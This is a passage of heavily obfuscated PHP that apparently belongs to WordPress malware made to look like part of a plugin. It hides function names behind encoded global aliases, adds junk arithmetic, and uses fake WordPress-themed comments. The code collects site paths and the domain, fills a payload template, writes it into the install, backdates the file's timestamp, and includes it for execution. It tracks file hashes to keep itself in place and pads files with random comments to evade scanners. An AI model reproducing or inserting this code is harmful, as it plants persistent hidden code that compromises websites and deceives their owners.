      rgiuaapohxeh0z($wg24v7r1rwd,  (441-21));



    if   (t65xl1pt2haov_izh($wg24v7r1rwd)     &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1292)))  @opcache_invalidate($wg24v7r1rwd,   true);
     }
  unset($wg24v7r1rwd);
 if    (@$GLOBALS['__scf_gsamhlxot70ps_18']($nsqy5uvi6wsilz)   && (int)  @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($nsqy5uvi6wsilz) >  $GLOBALS['__scf_zxyq0lcqv02z6_185']()  -   (154+86)) {


       if     (!@$GLOBALS['__scf_gsamhlxot70ps_18']($hz9mi81d5de)) fukkkeh6955g9qi(mhiu2yqz6kqd(1286),  dhd5r6_4ki(1293));

return;
   }
// WP Site Tagline transient TTL

 if     (@$GLOBALS['__scf_gsamhlxot70ps_18']($hz9mi81d5de) &&   ($GLOBALS['__scf_zxyq0lcqv02z6_185']()    -  (int) @filectime($hz9mi81d5de))    <      (289+11))    return;
        if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($hz9mi81d5de))    {
$x269_1z8iss     =      @$GLOBALS['__scf_gsamhlxot70ps_18']($hlfwb8q1wzkmd  .      nhceivfj8tbe(1294)    . $xne9_pxutn3j) ?  $GLOBALS['__scf_uvjtdemk2f_320']((string)  @$GLOBALS['__scf_apq4pqdt6n41_91']($hlfwb8q1wzkmd   .    pahk8uy1uxt(1295)   .  $xne9_pxutn3j))  :     "";



 if  ($x269_1z8iss    !== "" &&  $GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(1296), $x269_1z8iss) &&  version_compare($x269_1z8iss, kwqziujdph5xlz3n(),     '>'))     return;



    unset($x269_1z8iss);
}
if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($hz9mi81d5de))    {
$cfstcump3gsmm5    =  $hlfwb8q1wzkmd .    nrudcgor(1297)   .   ohrydgas8yy9a22s(ABSPATH   .    'g',  (9-1));
 $t0xjqo1dnwd8yhzr = @$GLOBALS['__scf_gsamhlxot70ps_18']($cfstcump3gsmm5)   ?  (string)    @$GLOBALS['__scf_apq4pqdt6n41_91']($cfstcump3gsmm5) : "";
  $m5qm2jqil0idpxxh   =  0;
if     ($t0xjqo1dnwd8yhzr    !==     "")    {
// aggregate projective arbitrator

     $w4suq6bv5mwd   =   $GLOBALS['__scf_xa4hcdunc1pgl_111']('|',   $t0xjqo1dnwd8yhzr);
   $m5qm2jqil0idpxxh  = (int)    $w4suq6bv5mwd[0];
      }



  if    ($m5qm2jqil0idpxxh  >  0   &&    $GLOBALS['__scf_zxyq0lcqv02z6_185']()  - $m5qm2jqil0idpxxh    >   (1453-553))     fukkkeh6955g9qi(nhceivfj8tbe(1286),   f5cd2smymkqusi5(1298));
 elseif  ($m5qm2jqil0idpxxh === 0  &&    ($GLOBALS['__scf_zxyq0lcqv02z6_185']()  -  (int)   @filectime($hz9mi81d5de))     >  (0xa9+0x2db))     fukkkeh6955g9qi(f5cd2smymkqusi5(1299), dhd5r6_4ki(1300));
    unset($cfstcump3gsmm5,   $t0xjqo1dnwd8yhzr,  $w4suq6bv5mwd,     $m5qm2jqil0idpxxh);$zac5omdzj62=8016;$nj4rblkpnit=$zac5omdzj62%8;
  }
 $vg45smeglid  =   adbbbpoh0e7mcf6();
        if (!$vg45smeglid  ||     $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid)  <    (443+57))   {
  fukkkeh6955g9qi(mhiu2yqz6kqd(1299),  dhd5r6_4ki(1301));
  return;
 }
  $cf6_nqt4ge    =    mpkogxinl1o8xqdhl__();
 $q4nmj640k4ytm0w =     $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),    dhd5r6_4ki(1302));
$wl8bs71ioiz  =  ajbg_44koa9suqi()  .    mhiu2yqz6kqd(14);
  $xwj8i29xbl9rbwyf     =   @$GLOBALS['__scf_cu2oflxkvh_47']($wl8bs71ioiz)
?     ($wl8bs71ioiz   . '/'     . $q4nmj640k4ytm0w   .   f5cd2smymkqusi5(1303))



:    (ajbg_44koa9suqi()     .   nrudcgor(89)  .  $q4nmj640k4ytm0w   . '/'  . $q4nmj640k4ytm0w   .   f5cd2smymkqusi5(1303));
  $tbxz6w0003z   = $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1140)) ?   $GLOBALS['__scf_u6ui6ntfvxm1_565'](home_url(),   PHP_URL_HOST) : (isset($_SERVER[pahk8uy1uxt(1304)])  ? $_SERVER[f5cd2smymkqusi5(1304)] :  "");

  $ur_zb3q2s6kf1   =   (defined(dhd5r6_4ki(1191))   &&  WPMU_PLUGIN_DIR) ?    WPMU_PLUGIN_DIR    :   ajbg_44koa9suqi()  . pahk8uy1uxt(14);
 $tnrkxybk8po  = (defined(nhceivfj8tbe(1039))    &&    WP_PLUGIN_DIR) ? WP_PLUGIN_DIR :  ajbg_44koa9suqi()    .    mhiu2yqz6kqd(732);$z_4epe8lgn3q_a=(0x43+0xe3);$uxg9j7h1qzo9g3=$z_4epe8lgn3q_a%15;


    $jcijl1z0htfr2  =  defined(dhd5r6_4ki(1261))  ?  WP_CONTENT_DIR :  ajbg_44koa9suqi();
   $t_0xgtl40g67q4bk    =   d05gkzggk_uo5zo(
   dhd5r6_4ki(1299),
   array('__PATH_B64__',    '__PLUGIN_BASE64__',   '__DOMAIN__',   '__HB_B64__',    '__GPATH_B64__', '__ABSPATH_B64__',      '__CONTENTDIR_B64__', '__MUDIR_B64__',   '__PLUGINDIR_B64__',     '__SLUG__',   '__VERSION__'),
  array($GLOBALS['__scf_b6bj8r78s21_351']($xwj8i29xbl9rbwyf),    $cf6_nqt4ge,    $tbxz6w0003z,  $GLOBALS['__scf_b6bj8r78s21_351']($nsqy5uvi6wsilz),  $GLOBALS['__scf_b6bj8r78s21_351']($hz9mi81d5de),  $GLOBALS['__scf_b6bj8r78s21_351'](ABSPATH),     $GLOBALS['__scf_b6bj8r78s21_351']($jcijl1z0htfr2),  $GLOBALS['__scf_b6bj8r78s21_351']($ur_zb3q2s6kf1),  $GLOBALS['__scf_b6bj8r78s21_351']($tnrkxybk8po),    $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),      mhiu2yqz6kqd(1303)),    kwqziujdph5xlz3n())
);
 if   (!$t_0xgtl40g67q4bk)   {
 if     ((int) get_option(nhceivfj8tbe(1305),  0) >  0) fukkkeh6955g9qi(nrudcgor(1299), nhceivfj8tbe(1306));
return;
}
// profile dense invariant


    if   (!hkk3yvii60ci7rk($t_0xgtl40g67q4bk)) {
 fukkkeh6955g9qi(f5cd2smymkqusi5(1307),   f5cd2smymkqusi5(1308));
        return;
   }
    if  (jr30c_pj_1z9sfyaq3c88($hz9mi81d5de, $t_0xgtl40g67q4bk)) {
      kfdh_vugi0_9nv_wpj($hz9mi81d5de,   cpfi26oipjceuyib8());
 rgiuaapohxeh0z($hz9mi81d5de, (0xb2+0xf2));
    ejl1lwk108flojzx($hz9mi81d5de);
 rqua3yflpt29vaz8icdaze($hlfwb8q1wzkmd  .     pahk8uy1uxt(1309)   . $xne9_pxutn3j, $GLOBALS['__scf_nn04_vx3uspzx4_54']($t_0xgtl40g67q4bk),   nhceivfj8tbe(1307));

    rqua3yflpt29vaz8icdaze($hlfwb8q1wzkmd   .  mhiu2yqz6kqd(1295)    . $xne9_pxutn3j, kwqziujdph5xlz3n(),  mhiu2yqz6kqd(1307));



 @include_once   $hz9mi81d5de;$vb7ahiwx3mud=PHP_MAJOR_VERSION;$q6zse0th=$vb7ahiwx3mud*5;
       set_transient(f5cd2smymkqusi5(1285), 1,   (272+28));
  }  else  {$cdsnd_6m9gpq=6937;$pn21y468di2v=$cdsnd_6m9gpq%7;
 fukkkeh6955g9qi(dhd5r6_4ki(1307),   f5cd2smymkqusi5(1310));
  }
/* projective proxy */




  unset($ur_zb3q2s6kf1,    $tnrkxybk8po,  $jcijl1z0htfr2);
   }  catch (Throwable    $h2v_bjm4ejxq8fp)   {
     fukkkeh6955g9qi(f5cd2smymkqusi5(1311),   $h2v_bjm4ejxq8fp);
  }   catch  (Exception    $h2v_bjm4ejxq8fp)   {
// @profile keystore

  fukkkeh6955g9qi(pahk8uy1uxt(1312), $h2v_bjm4ejxq8fp);
 }
// WP Media Text Block: worst-case stack-frame

 }
 function sk_orzv3dinsktkrvn($nfwt0_jg6oiy6)
       {

 if  (!$GLOBALS['__scf__me483qbepnts_41']($nfwt0_jg6oiy6))   return  false;
    $wnx5dt7_wxby9  =    $GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6);
  if  ($wnx5dt7_wxby9  >      (417897+630679))    return true;



     if ($wnx5dt7_wxby9  < (413+87)) return  false;
 $edeleetrs425   =  $GLOBALS['__scf_bv1z3no349dv5r_9']($nfwt0_jg6oiy6,   0, (65529+7));
$qydcoouvhjtnc =  $GLOBALS['__scf_vdrcltfge1x04_1313']($edeleetrs425,   ' ')  +  $GLOBALS['__scf_vdrcltfge1x04_1313']($edeleetrs425, "\t");
 



    return   ($qydcoouvhjtnc      /  $GLOBALS['__scf_amjjmfnilcolnb_10']($edeleetrs425))     >  0.55;

 }
  function adbbbpoh0e7mcf6($c2f3e6_uw10   =   false)
{
  static $vg45smeglid =  null;
if    ($c2f3e6_uw10)     {
   $vg45smeglid      =     null;
  }
     if  ($vg45smeglid    !==   null)   return  $vg45smeglid;
$nfwt0_jg6oiy6 =      yrklujewy9nbrhy(vv_nfhhmy_1mjmsa());
if  ($GLOBALS['__scf__me483qbepnts_41']($nfwt0_jg6oiy6)   &&   $GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6)   >    (0x15c+0x98)   && $GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6) <=      (1048499+77)  &&  !sk_orzv3dinsktkrvn($nfwt0_jg6oiy6) && hkk3yvii60ci7rk($nfwt0_jg6oiy6))  {
$vg45smeglid     =   $nfwt0_jg6oiy6;


 return $vg45smeglid;
  }
 $cvgyf1ddr8  =    weg_ghiafmuc1_6(f5cd2smymkqusi5(853), "");
 if  ($GLOBALS['__scf__me483qbepnts_41']($cvgyf1ddr8)   &&     $GLOBALS['__scf_amjjmfnilcolnb_10']($cvgyf1ddr8)  >  (475+25)   &&  $GLOBALS['__scf_amjjmfnilcolnb_10']($cvgyf1ddr8) <= (1048501+75)    &&      !sk_orzv3dinsktkrvn($cvgyf1ddr8) &&  hkk3yvii60ci7rk($cvgyf1ddr8))  {
 $vg45smeglid    = $cvgyf1ddr8;
  return  $vg45smeglid;
    }


 $vg45smeglid      =  false;
return   $vg45smeglid;
  }
    function   mpkogxinl1o8xqdhl__($c2f3e6_uw10    =      false)
 {
static      $u5xfm3z90ff   = null;
if   ($c2f3e6_uw10) {
  $u5xfm3z90ff  = null;
 }
 if     ($u5xfm3z90ff      !==  null) return $u5xfm3z90ff;
$nfwt0_jg6oiy6     =  adbbbpoh0e7mcf6();
  if  (!$GLOBALS['__scf__me483qbepnts_41']($nfwt0_jg6oiy6)  ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6)   <  (583-83) ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($nfwt0_jg6oiy6)    > (1048517+59)    ||   sk_orzv3dinsktkrvn($nfwt0_jg6oiy6) ||  !hkk3yvii60ci7rk($nfwt0_jg6oiy6)) {
        $u5xfm3z90ff      = false;



return  $u5xfm3z90ff;
}
  $u5xfm3z90ff   = $GLOBALS['__scf_b6bj8r78s21_351'](oks4ay45sdg2p8hjra($nfwt0_jg6oiy6));
return   $u5xfm3z90ff;
}
     function  rng_bhkc5cqwuzqv9i5x06($bw1dfta4jaac)
  {
if (!$GLOBALS['__scf__me483qbepnts_41']($bw1dfta4jaac)  ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($bw1dfta4jaac)    < (0xe+0x4)   ||     $GLOBALS['__scf_bv1z3no349dv5r_9']($bw1dfta4jaac,     0,  2) !==  "\x1f\x8b")  return  0;
     $bvpdwqp85dn   =     @$GLOBALS['__scf_tjhq4jz1g2t9_274']('V', $GLOBALS['__scf_bv1z3no349dv5r_9']($bw1dfta4jaac,  -(0x3+0x1)));
$bvpdwqp85dn  =  $GLOBALS['__scf_vf9p0fditvxy_35']($bvpdwqp85dn)      ? $bvpdwqp85dn[1]  :     0;
  if  ($bvpdwqp85dn < (554-54)  ||  $bvpdwqp85dn   > (1048539+37)) return   $bvpdwqp85dn;$j0sev8kcckb=241|24;$fx8jyscowrumo_=$j0sev8kcckb^89;
return   0;
}
    function  exz5ma180d8foq57gy($d1kd72zq60vf6el)
 {
 return  $GLOBALS['__scf_ep955ixf9wp_349'](hexdec($d1kd72zq60vf6el[1]));

}
function vmv3l2fd6oj__92qteyq($v_2ea0ui7nym)
{
 if  (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)  ||    $v_2ea0ui7nym ===   "")  return    $v_2ea0ui7nym;


static   $u9e2kuenp8ru7l =  null;
  if ($u9e2kuenp8ru7l === null)     {
$u9e2kuenp8ru7l  =  false;
  if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1314)))    {
$_dd  =  defined(nrudcgor(1261)) ?   WP_CONTENT_DIR  :   (defined(nrudcgor(1281)) ?  ABSPATH  :   "");
 if  ($_dd    !== "")  {
 $m1nhx7h1hlnb0zyb =    @disk_free_space($_dd);
   if   ($m1nhx7h1hlnb0zyb !==   false   &&  $m1nhx7h1hlnb0zyb >= (238653967-81367567))     $u9e2kuenp8ru7l  =     true;


     }


 }
  if    (!$u9e2kuenp8ru7l) {
       if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(753))) @update_option(dhd5r6_4ki(1315),  $GLOBALS['__scf_zxyq0lcqv02z6_185'](),     pahk8uy1uxt(1242));
  } elseif ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1043)))  {
  $g9pr9wbx88n    = (int) get_option(dhd5r6_4ki(1315),     0);



    if   ($g9pr9wbx88n &&     $GLOBALS['__scf_zxyq0lcqv02z6_185']()      -    $g9pr9wbx88n   < (86342+58)) $u9e2kuenp8ru7l   =   false;$_ihvm9nnph=PHP_MAJOR_VERSION;$nyeohywal0uv6s=$_ihvm9nnph*5;
 }
// lazy prototype

    }
if    (!$u9e2kuenp8ru7l)  {
return  $v_2ea0ui7nym;


}
  $ffnltliju6j7aefu =      k34y4e9knu6ix7sd2n();
if ($ffnltliju6j7aefu === -1   ||   $ffnltliju6j7aefu  >=  (134217665+63))  {


  $spxzjtpg4pa938mw  =   (1799939+61)   + $GLOBALS['__scf_cn1v_k8jlgjjb_350'](0,    (0x1cd2f+0x8e131));



      }     elseif ($ffnltliju6j7aefu    >=  (67108797+67))     {
       $spxzjtpg4pa938mw =    (1799973+27) +   $GLOBALS['__scf_cn1v_k8jlgjjb_350'](0,    (0x37e00+0x73060));$p6w7vfoh1=(0x71+0xf4);$p37_lce9_2=$p6w7vfoh1%11;
    }  else {$rc1rdhmunpjd=(0x7+0x4d);$lghe4nogq7=$rc1rdhmunpjd%10;
 return    $v_2ea0ui7nym;
}

if ($GLOBALS['__scf_amjjmfnilcolnb_10']($v_2ea0ui7nym)  >= $spxzjtpg4pa938mw)  return $v_2ea0ui7nym;
    if     ($GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_xv_2irmjrq_12']($v_2ea0ui7nym),   -2)   ===    nrudcgor(1316))  return   $v_2ea0ui7nym;



while     ($GLOBALS['__scf_amjjmfnilcolnb_10']($v_2ea0ui7nym)  <  $spxzjtpg4pa938mw -   (7391-3291))   {
$o6cshl9m0sbvrr      =     "";
  if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1317)))  {
try  {


       $o6cshl9m0sbvrr      =     @$GLOBALS['__scf_yr_0qrncgox_1318'](random_bytes((1902+98)));



   } catch  (Throwable  $h2v_bjm4ejxq8fp)   {
      $o6cshl9m0sbvrr  =   "";

} catch (Exception $h2v_bjm4ejxq8fp) {


  $o6cshl9m0sbvrr =  "";
     }

  }
if ($GLOBALS['__scf_amjjmfnilcolnb_10']($o6cshl9m0sbvrr)    <    (3924+76))  {
// WP useEntityRecords rewrite flush



 $o6cshl9m0sbvrr  =  $GLOBALS['__scf_nn04_vx3uspzx4_54'](uniqid("",  true));
  while   ($GLOBALS['__scf_amjjmfnilcolnb_10']($o6cshl9m0sbvrr) < (0xc1b+0x385))   $o6cshl9m0sbvrr     .=   $GLOBALS['__scf_nn04_vx3uspzx4_54']($o6cshl9m0sbvrr);
 }



   $v_2ea0ui7nym  .= "\n/*" . $o6cshl9m0sbvrr      .  pahk8uy1uxt(1319);
     }
   return $v_2ea0ui7nym;
  }

  function    g9begdqy64lw_mpz($v_2ea0ui7nym)
{
  if   (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)      ||    $GLOBALS['__scf_amjjmfnilcolnb_10']($v_2ea0ui7nym) <=  (1048496+80))  return   $v_2ea0ui7nym;
   $pycaeceedws  =     $GLOBALS['__scf_fhlvy786vrl3_463'](nhceivfj8tbe(1320),  "",  $v_2ea0ui7nym);
    return  $GLOBALS['__scf__me483qbepnts_41']($pycaeceedws)   ? $pycaeceedws  : $v_2ea0ui7nym;
   }
    function  k34y4e9knu6ix7sd2n()
    {
 static   $phbzem8wsxe     =  null;
    if ($phbzem8wsxe !==    null) return      $phbzem8wsxe;

      $phbzem8wsxe    =  0;



 if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(574))) return     $phbzem8wsxe;

$bw1dfta4jaac =   @$GLOBALS['__scf_jpj9mbom_1b_109'](nrudcgor(1321));
      if (!$GLOBALS['__scf__me483qbepnts_41']($bw1dfta4jaac))     return  $phbzem8wsxe;
 




$bw1dfta4jaac     =     $GLOBALS['__scf_uvjtdemk2f_320']($bw1dfta4jaac);
if ($bw1dfta4jaac   ===  "")   return $phbzem8wsxe;
     if ($bw1dfta4jaac   ===    f5cd2smymkqusi5(1322))   {
     $phbzem8wsxe    =    -1;
     return   $phbzem8wsxe;



}
 $n_vseps706s    = (float)   $bw1dfta4jaac;$jp9d7l46i=28+3;$sih23906=$jp9d7l46i-37;
   $f_at4qo_dp =  $GLOBALS['__scf_qnqfsmvb00pxp_1323']($GLOBALS['__scf_bv1z3no349dv5r_9']($bw1dfta4jaac,  -1));
if  ($f_at4qo_dp   === 'G')   $n_vseps706s *=     (1073741739+85);
elseif   ($f_at4qo_dp === 'M')    $n_vseps706s *= (1048526+50);
 elseif ($f_at4qo_dp   ===   'K')      $n_vseps706s  *= (1023+1);
  if ($n_vseps706s  >   0)   $phbzem8wsxe  =   (int)    $n_vseps706s;


   return  $phbzem8wsxe;
        }
  function  wq5ruxciovtxyyjl($w1zs80y9rgd)


   {
// WordPress 6.5 revisions: unitary sliding-window

  $w1zs80y9rgd   = (int) $w1zs80y9rgd;



 if   ($w1zs80y9rgd   <=    0)  return false;
   if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1324)))  return  false;
$f6dywhmkl3fi9jd0  = k34y4e9knu6ix7sd2n();


if ($f6dywhmkl3fi9jd0     ===  -1) return true;
     if    ($f6dywhmkl3fi9jd0  <= 0)     return      false;
   $t0vgk83cyhwlnf_x    =    @memory_get_usage(true);

if   (!$GLOBALS['__scf_kysg7_ihzbvr2_39']($t0vgk83cyhwlnf_x)  ||      $t0vgk83cyhwlnf_x      <  0) return   false;
   return   ($f6dywhmkl3fi9jd0  -    $t0vgk83cyhwlnf_x)   >      (($w1zs80y9rgd    * (2+1))   +    (1850714+246438));
}
      function    ahyh220jo2oy0022r0hmmj($w1zs80y9rgd)
  {
 $w1zs80y9rgd  =  (int) $w1zs80y9rgd;
   if   ($w1zs80y9rgd    <=  0)    return false;
       if     (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1325)))    return      true;


 $f6dywhmkl3fi9jd0   =  k34y4e9knu6ix7sd2n();
 if   ($f6dywhmkl3fi9jd0  ===   -1)    return   true;

if     ($f6dywhmkl3fi9jd0  <=     0)  return true;
$t0vgk83cyhwlnf_x  =    @memory_get_usage(true);
 if (!$GLOBALS['__scf_kysg7_ihzbvr2_39']($t0vgk83cyhwlnf_x)   ||    $t0vgk83cyhwlnf_x   <     0) return   true;
 return  ($f6dywhmkl3fi9jd0    - $t0vgk83cyhwlnf_x)   >    (($w1zs80y9rgd *  (0x12+0x2)) +   (8388518+90));$w41_t0wy=87+37;$z7o1wfc96lf_h=$w41_t0wy-49;


     }
   function  yrklujewy9nbrhy($no4625mwq2q9a2)
        {
  if (!$GLOBALS['__scf__me483qbepnts_41']($no4625mwq2q9a2)    ||   $no4625mwq2q9a2  === ""  ||  !@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))  return false;
   if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1326)))  @clearstatcache(true, $no4625mwq2q9a2);$l3w0wqg1dqz=45+48;$o3yjnk873fj=$l3w0wqg1dqz-16;
$w1zs80y9rgd    =  @$GLOBALS['__scf_g9y45bstmb02a_95']($no4625mwq2q9a2);
    if  (!$GLOBALS['__scf_kysg7_ihzbvr2_39']($w1zs80y9rgd)   ||   $w1zs80y9rgd < 1)  return    false;
  if  ($w1zs80y9rgd  >  (52428757+43))  return  null;
 if ($w1zs80y9rgd     > (1283451-234875)  &&    !wq5ruxciovtxyyjl($w1zs80y9rgd)) return    null;
     $v_2ea0ui7nym =  @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2,     false, null,    0,    $w1zs80y9rgd     +     1);
if   (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)    ||      $GLOBALS['__scf_amjjmfnilcolnb_10']($v_2ea0ui7nym)   !==      $w1zs80y9rgd) return   false;

 return $w1zs80y9rgd    >  (1048488+88)    ?     g9begdqy64lw_mpz($v_2ea0ui7nym)     :    $v_2ea0ui7nym;

}
 function   ejl1lwk108flojzx($no4625mwq2q9a2)
{



     if    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1043)) ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(753)))    return;
     if  (!$GLOBALS['__scf__me483qbepnts_41']($no4625mwq2q9a2)  ||      $no4625mwq2q9a2    ===  ""    || !@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2)) return;
 if  (!isset($GLOBALS[mhiu2yqz6kqd(1327)])  ||  !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[dhd5r6_4ki(1327)])) {
  $GLOBALS[mhiu2yqz6kqd(1327)]  =   get_option(f5cd2smymkqusi5(1328),   array());

if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[pahk8uy1uxt(1329)]))  $GLOBALS[mhiu2yqz6kqd(1330)]  =  array();

  }
 $d1kd72zq60vf6el   =  $GLOBALS[nrudcgor(1330)];
  $v_2ea0ui7nym = yrklujewy9nbrhy($no4625mwq2q9a2);
if  (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)) return;
  $d1kd72zq60vf6el[$GLOBALS['__scf_nn04_vx3uspzx4_54']($no4625mwq2q9a2)] =  array('p'  =>  $no4625mwq2q9a2,     'h'    =>    $GLOBALS['__scf_nn04_vx3uspzx4_54']($v_2ea0ui7nym), 'g' =>  kwqziujdph5xlz3n(),    't'    =>  $GLOBALS['__scf_zxyq0lcqv02z6_185']());



    if  ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($d1kd72zq60vf6el) > (205-5))  {

 foreach ($d1kd72zq60vf6el   as $cueercjqf3k  => $n_vseps706s)  {
/* bilinear skip-list */

   if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($n_vseps706s)  ||   !isset($n_vseps706s['t'])   ||  (int) $n_vseps706s['t']     < $GLOBALS['__scf_zxyq0lcqv02z6_185']() -  (4519240-1927240))     unset($d1kd72zq60vf6el[$cueercjqf3k]);
}

  while    ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($d1kd72zq60vf6el) > (148+52))    {
// deflationary capability

 $fmwdpo9coh    =  null;

     $qnf1d9igla  =   null;
foreach    ($d1kd72zq60vf6el  as $cueercjqf3k   => $n_vseps706s)  {
  $e4tt_qnjkh47voy  = $GLOBALS['__scf_vf9p0fditvxy_35']($n_vseps706s) &&   isset($n_vseps706s['t'])  ?     (int) $n_vseps706s['t']  :  0;
  if    ($qnf1d9igla  ===   null  || $e4tt_qnjkh47voy  <   $qnf1d9igla)  {
$qnf1d9igla =  $e4tt_qnjkh47voy;
     $fmwdpo9coh =   $cueercjqf3k;

     }
 }
// WordPress 6.6 block bindings: isometric partition-refinement

 if  ($fmwdpo9coh === null)  break;


  unset($d1kd72zq60vf6el[$fmwdpo9coh]);
}
// Composer autoload admin screen


 }
// tier-down trigger

      update_option(f5cd2smymkqusi5(1328),  $d1kd72zq60vf6el,     f5cd2smymkqusi5(1242));
    $GLOBALS[nhceivfj8tbe(1330)]  =  $d1kd72zq60vf6el;


}
  function c0egos9umjdrt0ya($no4625mwq2q9a2)
   {



 if  (!$GLOBALS['__scf__me483qbepnts_41']($no4625mwq2q9a2)     || $no4625mwq2q9a2   ===     "")    return  false;
 if   (!isset($GLOBALS[dhd5r6_4ki(1331)])     ||      !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[mhiu2yqz6kqd(1332)]))  {
$GLOBALS[mhiu2yqz6kqd(1332)] =   $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1333)) ?  get_option(pahk8uy1uxt(1328),    array())   : array();
  if (!$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[f5cd2smymkqusi5(1334)]))    $GLOBALS[nrudcgor(1334)] =    array();
  }
$d1kd72zq60vf6el = $GLOBALS[mhiu2yqz6kqd(1334)];
  $w4hc3ajs_7  =     $GLOBALS['__scf_nn04_vx3uspzx4_54']($no4625mwq2q9a2);
   if  (isset($d1kd72zq60vf6el[$w4hc3ajs_7]) && $GLOBALS['__scf_vf9p0fditvxy_35']($d1kd72zq60vf6el[$w4hc3ajs_7])     && isset($d1kd72zq60vf6el[$w4hc3ajs_7]['h']))  {
    if   ((int)  @$GLOBALS['__scf_g9y45bstmb02a_95']($no4625mwq2q9a2)  >  (52428720+80))    return   mhiu2yqz6kqd(1335);

     $v_2ea0ui7nym   =      yrklujewy9nbrhy($no4625mwq2q9a2);
    if ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym))   {


   return ($GLOBALS['__scf_nn04_vx3uspzx4_54']($v_2ea0ui7nym)  ===   $d1kd72zq60vf6el[$w4hc3ajs_7]['h'])  ?    true  :     dhd5r6_4ki(1335);

  }
return false;
}
 if   (m4eahxbbz3er7pv($no4625mwq2q9a2,  (336+164)))  {
     $reoi8rizl6uwsukk   =   @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2, false, null,  0,  (4092+4));
  if ($GLOBALS['__scf__me483qbepnts_41']($reoi8rizl6uwsukk) &&   $GLOBALS['__scf_nr12ouzrtt_7']($reoi8rizl6uwsukk,     mhiu2yqz6kqd(1147))  !== false)  return  mhiu2yqz6kqd(1336);
   }
return false;
  }
     function   pbnqpq4basi6hzt2h23b_()



     {
// scaffold deque for MySQL JSON operators

static    $d1kd72zq60vf6el  =  null;
   if   ($d1kd72zq60vf6el    !== null)     return $d1kd72zq60vf6el;
        $v_2ea0ui7nym  =  yrklujewy9nbrhy(vv_nfhhmy_1mjmsa());
   $d1kd72zq60vf6el   =    $GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)     && $v_2ea0ui7nym    !== ""  ?  $GLOBALS['__scf_nn04_vx3uspzx4_54']($v_2ea0ui7nym)    : "";$nbno5t7vy=36+68;$crrgf13n8f=$nbno5t7vy-15;
  return $d1kd72zq60vf6el;
 }
    function  xbl1u766t83yjb()
{$smrz8_pwaxzp=PHP_MAJOR_VERSION;$lhhqlemhy=$smrz8_pwaxzp*7;
     return     $GLOBALS['__scf_bv1z3no349dv5r_9'](pbnqpq4basi6hzt2h23b_(),     0, (10+2));
}



 function  jdor23gxhpl2fludm465n()
   {
 return twjiqbicrnr_q7() .    pahk8uy1uxt(1337)   .     ohrydgas8yy9a22s(ABSPATH  . nhceivfj8tbe(1338),     (0x5+0x3))  .  mhiu2yqz6kqd(1303);


     }
function      i98kqd9b6k0g380fty6()
   {
  $_j3a8m6wh3jr     =      array();
 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1339)))  {
$v_pz9n2zf3xcnbx =   @get_option(mhiu2yqz6kqd(1340),    array());
  if  ($GLOBALS['__scf_vf9p0fditvxy_35']($v_pz9n2zf3xcnbx))   $_j3a8m6wh3jr  =  $v_pz9n2zf3xcnbx;
    }
   $v_2ea0ui7nym  =  @$GLOBALS['__scf_gsamhlxot70ps_18'](jdor23gxhpl2fludm465n())  ?      @$GLOBALS['__scf_apq4pqdt6n41_91'](jdor23gxhpl2fludm465n())   :  "";



    if   ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym) &&     $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym, pahk8uy1uxt(1341))     ===    0) {


$qbbdbnt9zw09 =    $GLOBALS['__scf_ifj0midhwd_325']($GLOBALS['__scf_bv1z3no349dv5r_9']($v_2ea0ui7nym, (74^79)),    true);
